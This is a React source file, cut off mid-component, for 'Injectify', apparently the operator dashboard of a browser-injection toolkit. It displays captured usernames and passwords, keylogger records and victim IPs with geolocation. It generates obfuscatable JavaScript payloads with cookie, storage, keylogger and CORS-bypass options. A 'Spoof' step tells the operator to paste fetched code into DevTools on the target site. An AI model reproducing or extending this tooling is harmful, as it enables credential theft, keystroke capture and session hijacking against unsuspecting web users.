import ReactDOM, { render } from 'react-dom'
import React, { Component } from "react";
import Request from 'react-http-request';
import PropTypes from 'prop-types';
import MonacoEditor from 'react-monaco-editor';
import { withStyles } from 'material-ui/styles';
import Chip from 'material-ui/Chip';
import classNames from 'classnames';
import Drawer from 'material-ui/Drawer';
import AppBar from 'material-ui/AppBar';
import Toolbar from 'material-ui/Toolbar';
import List, { ListItem, ListItemAvatar, ListItemIcon, ListItemText } from 'material-ui/List';
import { MenuItem } from 'material-ui/Menu';
import url from 'url';
import Typography from 'material-ui/Typography';
import TextField from 'material-ui/TextField';
import Checkbox from 'material-ui/Checkbox';
import Divider from 'material-ui/Divider';
import ContentEditable from 'react-contenteditable';
import Save from 'material-ui-icons/Save';
import IconButton from 'material-ui/IconButton';
import MenuIcon from 'material-ui-icons/Menu';
import CodeIcon from 'material-ui-icons/Code';
import ChevronLeftIcon from 'material-ui-icons/ChevronLeft';
import ChevronRightIcon from 'material-ui-icons/ChevronRight';
import Button from 'material-ui/Button';
import Avatar from 'material-ui/Avatar';
import Tooltip from 'material-ui/Tooltip';
import Radio, { RadioGroup } from 'material-ui/Radio';
import { FormGroup, FormLabel, FormControl, FormControlLabel, FormHelperText } from 'material-ui/Form';
import Timestamp from 'react-timestamp';
import Tabs, { Tab } from 'material-ui/Tabs';
import ListSubheader from 'material-ui/List/ListSubheader';
import Input, { InputLabel } from 'material-ui/Input';
import Paper from 'material-ui/Paper';
import { LinearProgress } from 'material-ui/Progress';
import AddIcon from 'material-ui-icons/Add';
import KeyboardIcon from 'material-ui-icons/Keyboard';
import SettingsIcon from 'material-ui-icons/Settings';
import ComputerIcon from 'material-ui-icons/Computer';
import DeleteIcon from 'material-ui-icons/Delete';
import DeleteSweep from 'material-ui-icons/DeleteSweep';
import LockIcon from 'material-ui-icons/Lock';
import CloseIcon from 'material-ui-icons/Close';
import { CircularProgress } from 'material-ui/Progress';
import Slide from 'material-ui/transitions/Slide';
import ReactJson from 'react-json-view';
import {CopyToClipboard} from 'react-copy-to-clipboard';
import SyntaxHighlighter from 'react-syntax-highlighter';
import Card, { CardActions, CardContent } from 'material-ui/Card';
import { atomOneDark } from 'react-syntax-highlighter/styles/hljs';
import { indigo, red } from 'material-ui/colors';
import Switch from 'material-ui/Switch';
import Dialog, {
	DialogActions,
	DialogContent,
	DialogContentText,
	DialogTitle,
} from 'material-ui/Dialog';
import Table, { TableBody, TableCell, TableHead, TableRow } from 'material-ui/Table';

let drawerWidth = 240

function Transition(props) {
  return <Slide direction="up" {...props} />;
}

function escapeHTML(unsafe) {
  return unsafe
       .replace(/&/g, "&amp;")
       .replace(/</g, "&lt;")
       .replace(/>/g, "&gt;")
       .replace(/"/g, "&quot;")
       .replace(/'/g, "&#039;");
}

function unescapeHTML(unsafe) {
  return unsafe
       .replace(/&amp;/g, "&")
       .replace(/&lt;/g, "<")
       .replace(/&gt;/g, ">")
       .replace(/&quot;/g, "\"")
       .replace(/&#039;/g, "'");
}

const styles = theme => ({
  root: {
    width: '100%',
    height: '100%',
    zIndex: 1,
    overflow: 'hidden',
  },
  appFrame: {
    position: 'relative',
    display: 'flex',
    width: '100%',
    height: '100%',
  },
  flex: {
    flex: 1,
  },
  appBar: {
    position: 'absolute',
    transition: theme.transitions.create(['margin', 'width'], {
      easing: theme.transitions.easing.sharp,
      duration: theme.transitions.duration.leavingScreen,
    }),
  },
  noshadow: {
    boxShadow: 'none',
  },
  loading : {
    top: 64,
    width: '100%',
    position: 'absolute',
  },
  tabsLoading: {
    top: 136
  },
  '@media (min-width: 700px)': {
    appBarShift: {
      width: `calc(100% - ${drawerWidth}px)`,
      transition: theme.transitions.create(['margin', 'width'], {
        easing: theme.transitions.easing.easeOut,
        duration: theme.transitions.duration.enteringScreen,
      }),
      marginLeft: drawerWidth,
    },
  },
  leftIcon: {
    marginRight: 10,
  },
  newProject: {
    position: 'absolute',
    bottom: 15,
    right: 15,
  },
  toolbar: {
    minHeight: 64,
  },
  appBarHeader: {
    flex: '1',
    cursor: 'pointer',
    userSelect: 'none',
  },
  avatar: {
    width: 35,
    height: 35,
    marginLeft: 8,
  },
  switchUser: {
    minWidth: 300,
  },
  activeUser: {
    backgroundColor: 'rgba(64, 80, 181, 0.4) !important',
    userSelect: 'none',
  },
  menuButton: {
    marginLeft: 12,
    marginRight: 20,
  },
  recordContent: {
    paddingTop: 75,
  },
  hide: {
    display: 'none',
  },
  drawerPaper: {
    position: 'relative',
    height: '100%',
    width: drawerWidth,
  },
  drawerHeader: {
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'flex-end',
    padding: '0 8px',
    ...theme.mixins.toolbar,
  },
  content: {
    width: '100%',
    flexGrow: 1,
    backgroundColor: theme.palette.background.default,
    marginLeft: -drawerWidth,
    padding: theme.spacing.unit * 3,
    transition: theme.transitions.create('margin', {
      easing: theme.transitions.easing.sharp,
      duration: theme.transitions.duration.leavingScreen,
    }),
    height: 'calc(100% - 96px)',
    overflow: 'scroll',
    marginTop: 64,
    [theme.breakpoints.up('sm')]: {
      content: {
        height: 'calc(100% - 64px)',
        marginTop: 64,
      },
    },
  },
  tabsContent: {
    marginTop: 136,
    height: 'calc(100% - 167px)',
  },
  '@media (max-width: 699px)': {
    content: {
      marginLeft: 0,
    },
    drawerPaper: {
      flex: 'none',
      width: '256px !important',
    },
  },
  contentShift: {
    transition: theme.transitions.create('margin', {
      easing: theme.transitions.easing.easeOut,
      duration: theme.transitions.duration.enteringScreen,
    }),
    marginLeft: 0,
  },
  paper: {
    display: 'inline-block',
    minWidth: '100%',
  },
  contentCard: {
    marginBottom: 30,
  },
  tableCell: {
    padding: '4px 25px',
  },
  center: {
    textAlign: 'center',
  },
  '@media (max-width: 500px)': {
    content: {
      padding: theme.spacing.unit * 3 + "px " + theme.spacing.unit + "px",
    },
    tableCell: {
      padding: '4px 15px',
    }
  },
  '@media (max-width: 400px)': {
    content: {
      padding: theme.spacing.unit * 2 + "px " + theme.spacing.unit * .5 + "px",
    },
    tableCell: {
      padding: '4px 5px',
      textAlign: 'center',
    }
  },
  code: {
    whiteSpace: 'pre-wrap',
    wordWrap: 'break-word',
    maxHeight: '100%',
    padding: '0.5em 1em !important',
  },
  codeDialog: {
    background: '#282C34',
  },
  transparent: {
    background: 'none !important',
    boxShadow: 'none !important',
    overflow: 'hidden !important',
  },
  tabs: {
    background: indigo[600]
  },
  injectMain: {
    background: '#1E1E1E',
    overflow: 'hidden',
    padding: '0',
    height: 'calc(100% - 135px)',
  },
  loadingMain: {
    opactity: '0.4'
  },
  injectContainer: {
    display: 'flex',
    width: '100%',
    height: '100%',
  },
  injectList: {
    overflowY: 'scroll',
    height: 'calc(100% - 65px)',
  },
  chip: {
    margin: 5,
    minWidth: 170,
  },
  chipTransparent: {
    color: 'rgba(0, 0, 0, 0.1)',
    opacity: '0.7'
  },
  chipLabel: {
    justifyContent: 'center',
    flexGrow: 1,
    transition: 'all 0.2s ease'
  },
  myChip: {
    background: '#5d6ccc !important',
    color: 'rgba(255, 255, 255, 0.95) !important',
    transition: 'none !important',
  },
  row: {
    display: 'flex',
    justifyContent: 'center',
    flexWrap: 'wrap',
    background: 'rgba(0, 0, 0, 0.07)',
    padding: '8px 0',
  },
  hoverDarken: {
    backgroundColor: 'transparent',
    color: '#525358',
    transition: 'background-color 0.2s ease',
    '&:hover': {
      backgroundColor: 'rgba(47, 48, 51, 0.08)',
    },
    '&:active': {
      backgroundColor: 'rgba(47, 48, 51, 0.3)',
    },
  },
  title: {
    color: 'rgb(57, 72, 171)',
    fontSize: '1.3em',
    marginBottom: 26,
    fontWeight: 400,
  },
  changeName: {
    display: 'flex',
    userSelect: 'none',
  },
  changeNameInput: {
    flexGrow: 1,
  },
  changeNameButton: {
    margin: 10,
  },
  permissionGroup: {
    marginBottom: 0,
    marginTop: '1em',
    fontWeight: 500,
    display: 'flex',
    paddingBottom: 9,
    lineHeight: '32px',
  },
  permissionsHeader: {
    flexGrow: 1,
  },
  permissionDivider: {
    margin: '0.5em 0'
  },
  noneOfType: {
    background: 'none',
  },
  contentEditable: {
    outline: 0,
  },
})

class PersistentDrawer extends Component {
  state = {
    open: false,
    recordOpen: false,
    currentProject: null,
    loading: false,
    switchUserOpen: false,
    accounts: [],
    spoof: {
      open: false,
    },
    inject: {
      clients: []
    }
  }

  componentWillReceiveProps(nextProps) {
    if (nextProps.parentState.user.login !== this.props.parentState.user.login && this.props.parentState.width >= 700) {
      if (nextProps.parentState.user.login) {
        this.setState({ open: true })
      } else {
        this.setState({ open: false })
      }
    }

    if (nextProps.token !== this.props.token) {
      this.readAccounts()
    }

    if (nextProps.parentState.project !== this.props.parentState.project) {
      this.loading(false)
      this.setState({ currentProject: nextProps.parentState.project})
    }
  }

  componentWillMount() {
    if (window.location.href.slice(-10) == "/passwords") this.setState({tab: 0})
    if (window.location.href.slice(-10) == "/keylogger") this.setState({tab: 1})
    if (window.location.href.slice(-7 ) ==    "/inject") this.setState({tab: 2})
    if (window.location.href.slice(-7 ) ==    "/config") this.setState({tab: 3})
  }

  componentDidMount() {
    let { socket, token, parentState } = this.props

    socket.on(`err`, error => {
			this.setState({
        loading: false,
      })
    })

    socket.on(`inject:clients`, data => {
			this.setState({
        inject: {
          clients: data
        }
      })
    })
    
    this.readAccounts()
  }

  handleDrawerOpen = () => {
    this.setState({ open: true })
    setTimeout(() => {
      this.inject && this.inject.updateDimensions()
    }, 400)
  }

  handleDrawerClose = () => {
    this.setState({ open: false })
    setTimeout(() => {
      this.inject && this.inject.updateDimensions()
    }, 400)
  }

  handleRecordOpen = (record, index) => {
    this.setState({
      recordOpen: true,
      record: record,
      recordIndex: index,
    })
  }

  handleRecordClose = () => {
    this.setState({ recordOpen: false });
  }

  returnHome = () => {
    this.setState({ currentProject: null })
    this.props.emit("project:close")
    window.history.pushState('', 'Injectify', '/')
    document.getElementsByTagName('title')[0].innerHTML = 'Injectify'
  }

  loading = value => {
    this.props.setLoading(value)
  }

  readAccounts = () => {
    let accounts,
        { token, parentState } = this.props

    try {
      accounts = JSON.parse(localStorage.getItem('accounts'))
      if (!accounts) throw "a bomb"
    } catch(e) {
      accounts = [
        {
          token: token,
          user : parentState.user,
        }
      ]
    }

    this.setState({
      accounts: accounts
    })
  }

  saveAccounts = () => {
    localStorage.setItem("accounts", JSON.stringify(this.state.accounts))
    if(this.state.accounts.length == 0) {
      this.returnHome()
      this.props.signOut()
    }
  }

  addUser = () => {
    if (this.state.accounts.length) {

    } else {
      this.props.signIn()
    }
  }

  switchUser = () => {
    this.setState({
      switchUserOpen: true,
    })
  }

  handleSwitchUserClose = () => {
    this.setState({
      switchUserOpen: false,
    })
  }

  signOut = (index) => {
    let accounts = this.state.accounts
    accounts.splice(index, 1)
    this.setState({
      accounts: accounts,
    })

    this.saveAccounts()
  }

	viewJSON = () => {
		window.open("/api/json/" + encodeURIComponent(this.state.currentProject.name) + "?token=" + encodeURIComponent(this.props.token) /*+ "&download=true"*/)
  }

  spoofOpen = () => {
    this.setState({
      spoof: {
        open: true,
        modalOpen: true,
        url: "/api/spoof/" + encodeURIComponent(this.state.currentProject.name) + "?index=" + this.state.recordIndex + "&token=" + encodeURIComponent(this.props.token)
      }
    })
  }

  spoofClose = () => {
    this.setState({
      spoof: {
        ...this.state.spoof,
        modalOpen: false,
      }
    })
  }

  changeTab = (event, value) => {
    let { socket, setTab } = this.props
    let type = 'passwords'
    if (value == 1) type = 'keylogger'
    if (value == 2) type = 'inject'
    if (value == 3) type = 'config'

    if (type == 'config') {
      setTab(value)
    } else {
      this.loading(true)
      socket.emit(`project:read`, {
        name: this.state.currentProject.name,
        type: type,
      })
    }
    window.history.pushState('', ' - Injectify', '/projects/' + encodeURIComponent(this.state.currentProject.name) + '/' + type)
  }

  render() {
    const { classes, theme, signIn, parentState, loading } = this.props
    const { open } = this.state
    const { tab } = parentState

    return (
      <div className={classes.root}>
        <div className={classes.appFrame}>
          <AppBar
            className={`${classNames(classes.appBar, {
              [classes.appBarShift]: open,
            })} ${loading ? classes.noshadow : ""}`}
          >
            <Toolbar className={classes.toolbar}>
              <IconButton
                color="contrast"
                aria-label="open drawer"
                onClick={this.handleDrawerOpen}
                className={classNames(classes.menuButton, open && classes.hide)}
              >
                <MenuIcon />
              </IconButton>
              <Typography type="title" color="inherit" noWrap className={classes.appBarHeader} onClick={this.returnHome.bind(this)}>
                  Injectify [BETA]
              </Typography>
              {parentState.user.login ? (
                  <Button color="contrast" onClick={this.switchUser} className="signed-in">
                    {parentState.user.login}
                    <Avatar src={`${this.props.parentState.user.avatar_url}&s=40`} className={classes.avatar}/>
                  </Button>
                ) : (
                  <Button color="contrast" onClick={signIn} autoFocus>
                    Login with GitHub
                  </Button>
                )
              }
            </Toolbar>
            {this.state.currentProject ? (
              <Tabs
                value={tab}
                onChange={this.changeTab}
                indicatorColor={indigo[100]}
                fullWidth
                className={classes.tabs}
              >
                <Tab label="Passwords" icon={<LockIcon />} disabled={loading} />
                <Tab label="Keylogger" icon={<KeyboardIcon />} disabled={loading} />
                <Tab label="Inject" icon={<CodeIcon />} disabled={loading} />
                <Tab label="Project config" icon={<SettingsIcon />} disabled={loading} />
              </Tabs>
            ) : null
          }
          </AppBar>
          {loading ? (<LinearProgress className={`${classes.loading} ${this.state.currentProject ? classes.tabsLoading : ''}`} /> ) : null}
          <Drawer
            type={this.props.parentState.width >= 700 ? "persistent" : ''}
            classes={{
              paper: classes.drawerPaper,
            }}
            open={open}
            onRequestClose={this.handleDrawerClose.bind(this)}
          >
            <div className={classes.drawerInner}>
              <div className={classes.drawerHeader}>
                <IconButton onClick={this.handleDrawerClose}>
                  {theme.direction === 'rtl' ? <ChevronRightIcon /> : <ChevronLeftIcon />}
                </IconButton>
              </div>
              <ProjectList p={this.props} projects={parentState.projects} projectData={parentState.project} emit={this.props.emit} classes={classes} token={this.props.token} loading={this.loading.bind(this)} closeDrawer={this.handleDrawerClose.bind(this)}/>
            </div>
          </Drawer>
          {this.state.currentProject ? (
            <main
              className={`${classNames(classes.content, classes[`content`], {
                [classes.contentShift]: open,
              })} ${classes.tabsContent} ${tab === 2 && classes.injectMain} ${loading && classes.loadingMain}`}
              ref={main => {this.main = main}}
            >
              {tab === 0 &&
                <span>
                  <Paper className={classes.paper}>
                    <Table>
                      <TableHead>
                        <TableRow>
                          <TableCell className={classes.tableCell}>
                            Time
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Username
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Password
                          </TableCell>
                          <TableCell className={`${classes.tableCell} ${classes.center}`} width={64}>
                            Details
                          </TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {this.state.currentProject.passwords && this.state.currentProject.passwords.map((record, i) => {
                          return (
                            <TableRow key={i}>
                              <TableCell className={classes.tableCell}>
                                <Timestamp
                                  time={record.timestamp}
                                  format='ago'
                                  precision={this.props.parentState.width > 700 ? 2 : 1}
                                  autoUpdate={5}
                                />
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.username}
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.password}
                              </TableCell>
                              <TableCell className={classes.tableCell} numeric>
                                <Tooltip
                                  title={
                                    <span>
                                      {record.url.href && url.parse(record.url.href).hostname && record.url.title ? (
                                        <span>
                                          {url.parse(record.url.href).hostname} ({record.url.title})
                                          <br/>
                                        </span>
                                      ) : null}
                                      {record.ip.query && record.ip.country ? (
                                        <span>
                                          {record.ip.query} ({record.ip.country})
                                          <br/>
                                        </span>
                                      ) : null}
                                    </span>
                                  }
                                  placement="left"
                                  disableTriggerFocus
                                  disableTriggerTouch
                                >
                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record, i)}}>
                                    More
                                  </Button>
                                </Tooltip>
                              </TableCell>
                            </TableRow>
                          )
                        })}
                      </TableBody>
                    </Table>
                  </Paper>
                  <br />
                  <Javascript parentState={this.state} notify={this.props.notify} classes={classes} />
                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
                    <Button onClick={this.viewJSON} color="primary">
                      View JSON
                    </Button>
                  </Tooltip>
                  {this.state.recordOpen ? (
                    <span>
                      <Dialog
                        fullScreen
                        open={this.state.recordOpen}
                        onRequestClose={this.handleRecordClose}
                        transition={Transition}
                      >
                        <AppBar>
                          <Toolbar>
                            <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
                              <CloseIcon />
                            </IconButton>
                            <Typography type="title" color="inherit" className={classes.flex}>
                              Password record for {this.state.currentProject.name}
                            </Typography>
                            <Button color="contrast" onClick={this.spoofOpen.bind(this)}>
                              Spoof
                            </Button>
                          </Toolbar>
                        </AppBar>
                        <List className={classes.recordContent}>
                          <CopyToClipboard text={this.state.record.timestamp}
                            onCopy={() => this.props.notify({
                              title: "Copied to clipboard!",
                              message: this.state.record.timestamp
                            })}>
                            <ListItem button>
                              <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
                            </ListItem>
                          </CopyToClipboard>
                          <Divider />
                          <CopyToClipboard text={this.state.record.username}
                            onCopy={() => this.props.notify({
                              title: "Copied to clipboard!",
                              message: this.state.record.username
                            })}>
                            <ListItem button>
                              <ListItemText primary="Username" secondary={this.state.record.username} />
                            </ListItem>
                          </CopyToClipboard>
                          <Divider />
                          <CopyToClipboard text={this.state.record.password}
                            onCopy={() => this.props.notify({
                              title: "Copied to clipboard!",
                              message: this.state.record.password
                            })}>
                            <ListItem button>
                              <ListItemText primary="Password" secondary={this.state.record.password} />
                            </ListItem>
                          </CopyToClipboard>
                          <Divider />
                          {this.state.record.url.href ? (
                              <span>
                                <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
                                  <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
                                </ListItem>
                                <Divider />
                              </span>
                            ) : null
                          }
                          <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
                            <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                          </ListItem>
                          <Divider />
                          <CopyToClipboard text={`${this.state.record.browser.height}x${this.state.record.browser.width}px`}
                            onCopy={() => this.props.notify({
                              title: "Copied to clipboard!",
                              message: this.state.record.browser.height + "x" + this.state.record.browser.width + "px"
                            })}>
                            <ListItem button>
                              <ListItemText primary="Screen resolution" secondary={`${this.state.record.browser.height}x${this.state.record.browser.width}px`} />
                            </ListItem>
                          </CopyToClipboard>
                          <Divider />
                          <br />
                          <ListItem>
                            <ReactJson src={this.state.record} />
                          </ListItem>
                        </List>
                      </Dialog>
                      {this.state.spoof.open &&
                        <Request
                          url={this.state.spoof.url}
                          method='get'
                          verbose={true}
                        >
                          {
                            ({error, result, loading}) => {
                              if (loading) {
                                return (
                                  <Dialog open={this.state.spoof.modalOpen} classes={{ paper: classes.transparent }}>
                                    <CircularProgress size={60} style={{ color: indigo[50] }} />
                                  </Dialog>
                                )
                              } else {
                                return (
                                  <div>
                                    <Dialog open={this.state.spoof.modalOpen} onRequestClose={this.spoofClose} classes={{ paper: this.props.classes.codeDialog}}>
                                      <SyntaxHighlighter showLineNumbers language='javascript' style={atomOneDark} height={200} className={classes.code}>
                                        {result.text}
                                      </SyntaxHighlighter>
                                      <DialogActions>
                                        <Button onClick={this.spoofClose.bind(this)} color="contrast">
                                          Back
                                        </Button>
                                        <Button onClick={() => window.open(this.state.spoof.url)} color="contrast">
                                          Raw
                                        </Button>
                                        <CopyToClipboard text={result.text}
                                          onCopy={() => this.props.notify({
                                            title: "Copied to clipboard!",
                                            message: "Go onto the target site, and paste it into DevTools"
                                        })}>
                                          <Button color="contrast">
                                            Copy
                                          </Button>
                                        </CopyToClipboard>
                                      </DialogActions>
                                    </Dialog>
                                  </div>
                                )
                              }
                            }
                          }
                        </Request>
                      }
                    </span>
                    ) : null
                  }
                </span>
              }
              {tab === 1 &&
                <span>
                  <Paper className={classes.paper}>
                    <Table>
                      <TableHead>
                        <TableRow>
                          <TableCell className={classes.tableCell}>
                            Time
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            Keystrokes
                          </TableCell>
                          <TableCell className={classes.tableCell}>
                            IP Address
                          </TableCell>
                          <TableCell className={`${classes.tableCell} ${classes.center}`} width={64}>
                            Details
                          </TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {this.state.currentProject.keylogger && this.state.currentProject.keylogger.map((record, i) => {
                          return (
                            <TableRow key={i}>
                              <TableCell className={classes.tableCell}>
                                <Timestamp
                                  time={record.timestamp}
                                  format='ago'
                                  precision={this.props.parentState.width > 700 ? 2 : 1}
                                  autoUpdate={5}
                                />
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {Math.round(record.keys.length / 2)}
                              </TableCell>
                              <TableCell className={classes.tableCell}>
                                {record.ip.query}
                              </TableCell>
                              <TableCell className={classes.tableCell} numeric>
                                <Tooltip
                                  title={
                                    <span>
                                      {record.url.href && url.parse(record.url.href).hostname && record.url.title ? (
                                        <span>
                                          {url.parse(record.url.href).hostname} ({record.url.title})
                                          <br/>
                                        </span>
                                      ) : null}
                                      {record.ip.query && record.ip.country ? (
                                        <span>
                                          {record.ip.query} ({record.ip.country})
                                          <br/>
                                        </span>
                                      ) : null}
                                    </span>
                                  }
                                  placement="left"
                                  disableTriggerFocus
                                  disableTriggerTouch
                                >
                                  <Button color="primary" dense onClick={() => {this.handleRecordOpen(record)}}>
                                    More
                                  </Button>
                                </Tooltip>
                              </TableCell>
                            </TableRow>
                          )
                        })}
                      </TableBody>
                    </Table>
                  </Paper>
                  <Tooltip title="Show the raw JSON database entries" placement="bottom">
                    <Button onClick={this.viewJSON} color="primary">
                      View JSON
                    </Button>
                  </Tooltip>
                  {this.state.recordOpen ? (
                    <Dialog
                      fullScreen
                      open={this.state.recordOpen}
                      onRequestClose={this.handleRecordClose}
                      transition={Transition}
                    >
                      <AppBar>
                        <Toolbar>
                          <IconButton color="contrast" onClick={this.handleRecordClose} aria-label="Close">
                            <CloseIcon />
                          </IconButton>
                          <Typography type="title" color="inherit" className={classes.flex}>
                            Keylogger record for {this.state.currentProject.name}
                          </Typography>
                          {/* <Button color="contrast" onClick={this.handleRecordClose}>
                            save
                          </Button> */}
                        </Toolbar>
                      </AppBar>
                      <List className={classes.recordContent}>
                        <CopyToClipboard text={this.state.record.timestamp}
                          onCopy={() => this.props.notify({
                            title: "Copied to clipboard!",
                            message: this.state.record.timestamp
                          })}>
                          <ListItem button>
                            <ListItemText primary="Timestamp" secondary={<Timestamp time={this.state.record.timestamp} format='full' />} />
                          </ListItem>
                        </CopyToClipboard>
                        <Divider />
                        {this.state.record.url.href ? (
                            <span>
                              <ListItem button onClick={() => {window.open(this.state.record.url.href).bind}}>
                                <ListItemText primary="Capture URL" secondary={this.state.record.url.href} />
                              </ListItem>
                              <Divider />
                            </span>
                          ) : null
                        }
                        <ListItem button onClick={() => {window.open("https://tools.keycdn.com/geo?host=" + this.state.record.ip.query)}}>
                          <ListItemText primary="IP Address" secondary={`${this.state.record.ip.query}${this.state.record.ip.country ? " (" + this.state.record.ip.city + " - " + this.state.record.ip.country + ")" : ""}`} />
                        </ListItem>
                        <Divider />
                        <br />
                        <ListItem>
                          <ReactJson src={this.state.record} />
                        </ListItem>
                      </List>
                    </Dialog>
                    ) : null
                  }
                </span>
              }
              {tab === 2 && !this.state.hideMonaco &&
                <Inject classes={classes} w={this.main ? this.main.offsetWidth : null} h={this.main ? this.main.offsetHeight : null} socket={this.props.socket} project={this.state.currentProject.name} ref={instance => { this.inject = instance }} clients={this.state.inject.clients} />
              }
              {tab === 3 && 
                <ProjectConfig classes={classes} project={this.state.currentProject} loggedInUser={this.props.parentState.user} emit={this.props.emit} loading={this.loading} socket={this.props.socket} loading={this.loading} token={this.props.token} />
              }
              <Tooltip title="New project" placement="left">
                <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
                  <AddIcon />
                </Button>
              </Tooltip>
            </main>
              ) : (
                <main
                  className={classNames(classes.content, classes[`content`], {
                    [classes.contentShift]: open,
                  })}
                >
                  {this.props.children}
                  <Tooltip title="New project" placement="left">
                    <Button fab color="primary" aria-label="add" className={classes.newProject} onClick={this.props.newProject}>
                      <AddIcon />
                    </Button>
                  </Tooltip>
                </main>
            )
          }
        </div>
        <Dialog open={this.state.switchUserOpen} onRequestClose={this.handleSwitchUserClose} classes={{ paper:classes.switchUser }}>
          <DialogTitle>
            Switch accounts
          </DialogTitle>
          <div>
            <List>
              {this.state.accounts.map((account, i) => (
                <ListItem
                  button={account.user.id !== parentState.user.id}
                  key={i}
                  className={account.user.id == parentState.user.id && classes.activeUser}
                >
                  <ListItemAvatar>
                    <Avatar
                      src={`https://avatars3.githubusercontent.com/u/${account.user.id}?v=4&s=70`} />
                  </ListItemAvatar>
                  <ListItemText primary={account.user.login} />
                  <ListItemAvatar>
                    <Avatar className={classes.hoverDarken}>
                      <CloseIcon onClick={() => this.signOut(i)} />
                    </Avatar>
                  </ListItemAvatar>
                </ListItem>
              ))}
              {this.state.accounts.length !== 0 && <Divider />}
              <ListItem
                button
                onClick={this.addUser.bind(this)}
              >
                <ListItemAvatar>
                  <Avatar>
                    <AddIcon />
                  </Avatar>
                </ListItemAvatar>
                <ListItemText primary="add account" />
              </ListItem>
            </List>
          </div>
        </Dialog>
      </div>
    )
  }
}

class ProjectList extends Component {
	render() {
    const { classes, theme } = this.props;
		if (this.props.projects && this.props.projects[0]) {
			return (
        <div>
          <List className={classes.list} subheader={<ListSubheader>My account</ListSubheader>}>
            <ListItem button>
              <ListItemIcon>
                <SettingsIcon />
              </ListItemIcon>
              <ListItemText primary="Configuration" />
            </ListItem>
          </List>
          <Divider />
          <List className={classes.list} subheader={<ListSubheader>My projects</ListSubheader>}>
            {this.props.projects.map((project, i) =>
              <Project raised color="primary" key={i} record={project.name} p={this.props} />
            )}
          </List>
        </div>
			)
		} else {
			return null
		}
	}
}

class Project extends Component {
	handleClickOpen = (a) => {
    let { record } = this.props
    let { projectData, closeDrawer, emit, loading } = this.props.p
    let { parentState } = this.props.p.p

    let type = 'passwords'
    if (window.location.href.slice(-10) == "/keylogger") type = "keylogger"
    if (window.location.href.slice(-7) == "/inject") type = "inject"
    if (window.location.href.slice(-7) == "/config") type = "config"

    if (parentState.width <= 700) closeDrawer()
    emit("project:close")
    if (type !== 'config' && projectData && projectData.name !== record) {
      emit("project:read", {
        name: this.props.record,
        type: 'overview'
      })
    }
		emit("project:read", {
      name: this.props.record,
      type: type
    })
    loading(true)
    window.history.pushState('', record + ' - Injectify', '/projects/' + encodeURIComponent(record) + '/' + type)
	}

	render() {
		return (
      <ListItem button onClick={this.handleClickOpen} className={this.props.p.projectData && this.props.p.projectData.name == this.props.record ? "active" : null}>
        <ListItemText primary={this.props.record} />
      </ListItem>
		)
	}
}

class Javascript extends Component {
  state = {
    open: false,
    javascriptURL: false,
    options: {
      format: 'minified',
      cookies: true,
      storage: false,
      passwords: true,
      keylogger: false,
      base64: true,
      bypassCors: false,
    },
  }

  handleClickOpen = () => {
    this.setState({ open: true })
  }

  handleRequestClose = () => {
    this.setState({
      open: false
    })
    setTimeout(() => {
      this.setState({
        javascriptURL: false
      })
    }, 300)
  }

  componentWillMount() {
    let savedOptions
    try {
      savedOptions = JSON.parse(localStorage.getItem("payload-generator"))
    } catch(e) {
      localStorage.setItem("payload-generator", '')
      return
    }
    if (savedOptions && Object.keys(savedOptions).length == Object.keys(this.state.options).length) {
      this.setState({ options: savedOptions})
    } else {
      localStorage.setItem("payload-generator", '')
    }
  }

  componentDidUpdate() {
    localStorage.setItem("payload-generator", JSON.stringify(this.state.options))
  }

  viewJS = () => {
    let params = ''
    if (this.state.options.cookies == false) params += "&cookies=false"
    if (this.state.options.storage == false) params += "&sessionStorage=false&localStorage=false"
    if (this.state.options.format == 'commented') params += "&comments=true"
    if (this.state.options.format == 'minified') params += "&minify=true"
    if (this.state.options.format == 'obfuscated') params += "&obfuscate=true"
    if (this.state.options.passwords == false) params += "&passwords=false"
    if (this.state.options.keylogger == true) params += "&keylogger=true"
    if (this.state.options.base64 == false) params += "&base64=false"
    if (this.state.options.bypassCors == true) params += "&bypassCors=true"
    this.setState({
      javascriptURL: "/api/payload/?project=" + encodeURIComponent(this.props.parentState.currentProject.name) + params
    })
  }

  back = () => {
    this.setState({
      javascriptURL: false
    })
  }

  raw = () => {
    window.open(this.state.javascriptURL, '_blank')
  }

  render() {
    return (
      <div>
        <Tooltip title="Payload for this project" placement="bottom">
          <Button onClick={this.handleClickOpen} color="primary">
            Javascript code
          </Button>
        </Tooltip>  
          {this.state.javascriptURL ? (
            <div>              
              <Request
                url={this.state.javascriptURL}
                method='get'
                verbose={true}
              >
                {
                  ({error, result, loading}) => {
                    if (loading) {
                      return (
                        <Dialog open={this.state.open} classes={{ paper: this.props.classes.transparent }}>
                          <CircularProgress size={60} style={{ color: indigo[50] }} />
                        </Dialog>
                      )
                    } else {
                      return (
                        <div>
                          <Dialog open={this.state.open} onRequestClose={this.handleRequestClose} classes={{ paper: this.props.classes.codeDialog}}>
                            <SyntaxHighlighter showLineNumbers language='javascript' style={atomOneDark} height={200} className={this.props.classes.code}>
                              {result.text}
                            </SyntaxHighlighter>
                            <DialogActions>
                              <Button onClick={this.back.bind(this)} color="contrast">
                                Back
                              </Button>
                              <Button onClick={this.raw.bind(this)} color="contrast">
                                Raw
                              </Button>
                              <CopyToClipboard text={result.text}
                                onCopy={() => this.props.notify({
                                  title: "Copied to clipboard!",
                                  message: "Try testing it in DevTools"
                              })}>
                                <Button color="contrast">
                                  Copy
                                </Button>
                              </CopyToClipboard>
